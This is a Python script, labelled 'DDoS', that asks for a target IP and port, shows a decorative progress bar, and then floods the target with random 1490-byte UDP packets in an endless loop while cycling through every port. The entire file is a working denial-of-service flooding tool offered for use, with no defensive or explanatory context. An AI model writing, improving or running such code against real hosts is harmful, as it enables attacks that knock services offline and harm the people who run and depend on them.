import sys
import os
import time
import socket
import random
from termcolor import colored

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP Protocol
bytes = random._urandom(1490)
#############

def attack(host,port):
    os.system("clear")
    print(colored("[*]Sending traffic on {}:{}".format(host,port),"green",attrs=["reverse","blink"]))
    print(colored("[                    ] 0% ","white"))
    time.sleep(3)
    print(colored("[=====               ] 25%","red"))
    time.sleep(3)
    print(colored("[==========          ] 50%","yellow"))
    time.sleep(3)
    print(colored("[===============     ] 75%","cyan"))
    time.sleep(3)
    print(colored("[====================] 100%","green"))
    time.sleep(3)
    sent = 0
    while True:
        sock.sendto(bytes, (host,port))
        sent += 1
        port += 1
        print("Sent %s packet to %s throught port:%s"%(sent,host,port))
        if port == 65534:
            port = 1
def main():
    print(colored("[*]DDoS","blue",attrs=["bold"]))
    try:
        ip = input("IP Target : ")
        port = int(input("Port       : "))
        attack(ip,port)
    except Exception as E:
        print(E)
        print(colored("[!]Issues Encountered. Try again.","red",attrs=["underline"]))

